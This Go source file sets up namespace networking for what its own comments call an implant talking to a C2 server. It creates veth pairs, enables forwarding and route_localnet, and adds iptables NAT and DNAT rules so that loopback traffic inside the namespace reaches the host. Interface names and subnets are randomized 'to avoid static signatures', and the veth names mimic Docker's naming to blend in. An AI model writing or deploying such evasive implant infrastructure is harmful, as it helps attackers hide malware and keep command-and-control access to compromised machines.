package namespace

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os/exec"
	"strconv"
	"time"
)

const (
	vethNS   = "eth0"
	cidrMask = "/30"
)

// Network parameters randomized at import time to avoid static signatures.
var (
	vethHost string
	hostIP   string
	nsIP     string
	subnet   string
)

func init() {
	// Generate a random veth name matching Docker naming: veth + 7 hex chars.
	b := make([]byte, 4)
	_, _ = rand.Read(b)
	vethHost = "veth" + hex.EncodeToString(b)[:7]

	// Randomize the /30 subnet from the 10.0.0.0/8 private range.
	sb := make([]byte, 3)
	_, _ = rand.Read(sb)
	second := int(sb[0])
	third := int(sb[1])
	base := int(sb[2]) & 0xFC // /30-aligned fourth octet only
	if base == 0 {
		base = 4 // avoid .0 network
	}
	hostIP = fmt.Sprintf("10.%d.%d.%d", second, third, base+1)
	nsIP = fmt.Sprintf("10.%d.%d.%d", second, third, base+2)
	subnet = fmt.Sprintf("10.%d.%d.%d/30", second, third, base)
}

// SetupVethPair creates and configures the host side of the veth pair.
// Called from the parent process after forking the namespaced child.
// nsPid is the PID of the child process (in the host PID namespace).
func SetupVethPair(nsPid int) error {
	pidStr := strconv.Itoa(nsPid)

	// Create the veth pair. One end stays on the host, the other goes into the namespace.
	if err := run("ip", "link", "add", vethHost, "type", "veth", "peer", "name", vethNS); err != nil {
		return fmt.Errorf("net: failed to create veth pair: %w", err)
	}

	// Move the namespace end into the child's network namespace.
	if err := run("ip", "link", "set", vethNS, "netns", pidStr); err != nil {
		return fmt.Errorf("net: failed to move %s to ns pid %d: %w", vethNS, nsPid, err)
	}

	// Configure the host-side address and bring the interface up.
	if err := run("ip", "addr", "add", hostIP+cidrMask, "dev", vethHost); err != nil {
		return fmt.Errorf("net: failed to set host veth address: %w", err)
	}
	if err := run("ip", "link", "set", vethHost, "up"); err != nil {
		return fmt.Errorf("net: failed to bring up host veth: %w", err)
	}

	// Enable IP forwarding so the namespace can route through the host.
	if err := enableIPForwarding(); err != nil {
		return fmt.Errorf("net: failed to enable ip forwarding: %w", err)
	}

	// Set up NAT (masquerade) so namespace traffic appears to come from the host.
	if err := setupNAT(); err != nil {
		return fmt.Errorf("net: failed to configure NAT: %w", err)
	}

	return nil
}

// ConfigureNamespaceNetwork sets up networking inside the namespace.
// Called from the child process after the parent has moved the veth end in.
func ConfigureNamespaceNetwork() error {
	// Bring up loopback first.
	if err := bringUpLoopback(); err != nil {
		return fmt.Errorf("net: failed to bring up loopback: %w", err)
	}

	// Configure the namespace-side veth address.
	// Retry because the parent may not have moved the veth into our namespace yet.
	var err error
	for i := 0; i < 10; i++ {
		err = run("ip", "addr", "add", nsIP+cidrMask, "dev", vethNS)
		if err == nil {
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	if err != nil {
		// Truly unavailable after retries; non-fatal.
		return nil
	}

	// Bring the interface up.
	if err := run("ip", "link", "set", vethNS, "up"); err != nil {
		return fmt.Errorf("net: failed to bring up ns veth: %w", err)
	}

	// Set default route through the host-side veth IP.
	if err := run("ip", "route", "add", "default", "via", hostIP); err != nil {
		return fmt.Errorf("net: failed to set default route: %w", err)
	}

	return nil
}

// bringUpLoopback activates the loopback interface inside the namespace.
func bringUpLoopback() error {
	if err := run("ip", "link", "set", "lo", "up"); err != nil {
		return fmt.Errorf("net: failed to bring up loopback: %w", err)
	}
	return nil
}

// enableIPForwarding writes to /proc to enable packet forwarding on the host.
// route_localnet=1 is required so that DNAT rules targeting 127.0.0.1 work on
// non-loopback interfaces — without it the kernel drops packets with a loopback
// destination arriving on a regular interface as "martian" packets.
func enableIPForwarding() error {
	if err := run("sysctl", "-w", "net.ipv4.ip_forward=1"); err != nil {
		return err
	}
	return run("sysctl", "-w", "net.ipv4.conf.all.route_localnet=1")
}

// setupNAT configures iptables masquerade so namespace traffic is NATed
// through the host's external interface.
func setupNAT() error {
	// Add masquerade rule for traffic from the namespace subnet.
	// The -C check prevents duplicate rules on repeated invocations.
	if err := run("iptables", "-t", "nat", "-C", "POSTROUTING", "-s", subnet, "-j", "MASQUERADE"); err != nil {
		if err := run("iptables", "-t", "nat", "-A", "POSTROUTING", "-s", subnet, "-j", "MASQUERADE"); err != nil {
			return fmt.Errorf("net: failed to add NAT masquerade rule: %w", err)
		}
	}

	// Allow forwarding from the namespace subnet.
	if err := run("iptables", "-C", "FORWARD", "-s", subnet, "-j", "ACCEPT"); err != nil {
		if err := run("iptables", "-A", "FORWARD", "-s", subnet, "-j", "ACCEPT"); err != nil {
			return fmt.Errorf("net: failed to add forward accept rule: %w", err)
		}
	}

	// Allow forwarding for established connections back to the namespace subnet.
	if err := run("iptables", "-C", "FORWARD", "-d", subnet, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"); err != nil {
		if err := run("iptables", "-A", "FORWARD", "-d", subnet, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"); err != nil {
			return fmt.Errorf("net: failed to add forward established rule: %w", err)
		}
	}

	// DNAT traffic from the namespace subnet destined for 127.0.0.1 to the
	// host veth IP. This allows the implant inside the namespace to reach a C2
	// server listening on the host's loopback (127.0.0.1) by connecting to
	// 127.0.0.1 — the kernel rewrites the destination to hostIP before routing,
	// and the host forwards the packet to its own loopback services.
	if err := run("iptables", "-t", "nat", "-C", "PREROUTING", "-s", subnet, "-d", "127.0.0.1", "-j", "DNAT", "--to-destination", hostIP); err != nil {
		if err := run("iptables", "-t", "nat", "-A", "PREROUTING", "-s", subnet, "-d", "127.0.0.1", "-j", "DNAT", "--to-destination", hostIP); err != nil {
			return fmt.Errorf("net: failed to add DNAT loopback redirect rule: %w", err)
		}
	}

	return nil
}

// CleanupHostNetwork removes host-side network artifacts created by
// SetupVethPair: the veth interface, iptables rules, and sysctl changes.
// Best-effort; errors are silently ignored since artifacts may already be gone.
func CleanupHostNetwork() {
	// Remove the host-side veth interface. Deleting one end of a veth pair
	// automatically removes the peer.
	_ = run("ip", "link", "del", vethHost)

	// Remove iptables NAT and forwarding rules.
	_ = run("iptables", "-t", "nat", "-D", "POSTROUTING", "-s", subnet, "-j", "MASQUERADE")
	_ = run("iptables", "-D", "FORWARD", "-s", subnet, "-j", "ACCEPT")
	_ = run("iptables", "-D", "FORWARD", "-d", subnet, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT")
	_ = run("iptables", "-t", "nat", "-D", "PREROUTING", "-s", subnet, "-d", "127.0.0.1", "-j", "DNAT", "--to-destination", hostIP)

	// Restore route_localnet — this is an unusual setting that weakens host
	// security. We do NOT restore ip_forward because it may have been enabled
	// before us and disabling it could break legitimate host networking.
	_ = run("sysctl", "-w", "net.ipv4.conf.all.route_localnet=0")
}

// run executes an external command and returns an error if it fails.
func run(name string, args ...string) error {
	cmd := exec.Command(name, args...)
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("network setup command failed: %w", err)
	}
	return nil
}
